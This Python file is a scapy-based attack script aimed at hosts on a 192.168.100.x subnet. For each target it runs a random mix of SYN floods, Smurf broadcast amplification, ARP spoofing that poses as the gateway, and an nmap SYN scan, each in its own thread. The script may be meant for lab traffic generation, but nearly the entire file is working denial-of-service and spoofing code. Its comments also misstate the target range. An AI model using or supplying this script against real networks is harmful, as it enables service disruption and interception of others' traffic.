import os
import random
import threading
import time
import scapy.all as scapy
from scapy.all import IP, ICMP, TCP, RandShort, send

# Target IP range - all 10 clients
target_ips = [f"192.168.100.{i}" for i in range(11, 13)]  # IPs from 192.168.100.10 to 192.168.100.19

def dos_attack(target_ip):
    print(f"Starting DoS attack on {target_ip}")
    packet = IP(dst=target_ip)/TCP(dport=80, sport=RandShort(), flags="S")
    send(packet, count=5000, verbose=False)
    print(f"DoS attack completed on {target_ip}")

def smurf_attack(target_ip):
    print(f"Starting Smurf attack on {target_ip}")
    broadcast_ip = "192.168.100.255"
    packet = IP(src=target_ip, dst=broadcast_ip)/ICMP()
    send(packet, count=5000, verbose=False)
    print(f"Smurf attack completed on {target_ip}")

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast / arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc if answer else None

def arp_spoof(target_ip):
    print(f"Starting ARP spoofing on {target_ip}")
    spoofed_ip = "192.168.100.1"  # Gateway IP
    mac = get_target_mac(target_ip)
    if mac:
        packet = scapy.Ether(dst=mac) / scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
        scapy.sendp(packet, count=100, verbose=False)
        print(f"ARP spoofing completed on {target_ip}")
    else:
        print(f"Failed to get MAC address for {target_ip}")

def nmap_scan(target_ip):
    print(f"Starting Nmap scan on {target_ip}")
    os.system(f"nmap -sS -p 20-100 {target_ip} -T4 --max-rtt-timeout 200ms")
    print(f"Nmap scan completed on {target_ip}")

def attack_client(target_ip):
    """Run random attacks against a specific client"""
    print(f"Launching attacks against {target_ip}")
    
    attacks = [
        lambda: dos_attack(target_ip),
        lambda: smurf_attack(target_ip),
        lambda: arp_spoof(target_ip),
        lambda: nmap_scan(target_ip)
    ]
    
    # Select a random number of attacks between 2 and 4
    num_attacks = random.randint(2, 4)
    
    # Select the random attacks
    selected_attacks = random.sample(attacks, num_attacks)
    
    attack_threads = []
    
    # Launch each selected attack in a separate thread
    for attack in selected_attacks:
        thread = threading.Thread(target=attack)
        attack_threads.append(thread)
        thread.start()
    
    # Wait for all attacks to complete
    for thread in attack_threads:
        thread.join()
    
    print(f"All attacks completed against {target_ip}")

def main():
    # Create a thread for each target IP
    client_threads = []
    
    for target_ip in target_ips:
        # Slight delay to stagger attack start times
        time.sleep(0.5)
        thread = threading.Thread(target=attack_client, args=(target_ip,))
        client_threads.append(thread)
        thread.start()
        print(f"Started attack thread for {target_ip}")
    
    # Wait for all client attack threads to complete
    for thread in client_threads:
        thread.join()
    
    print("All attacks against all clients completed")

if __name__ == "__main__":
    print(f"Starting multi-client attack against {len(target_ips)} targets")
    main()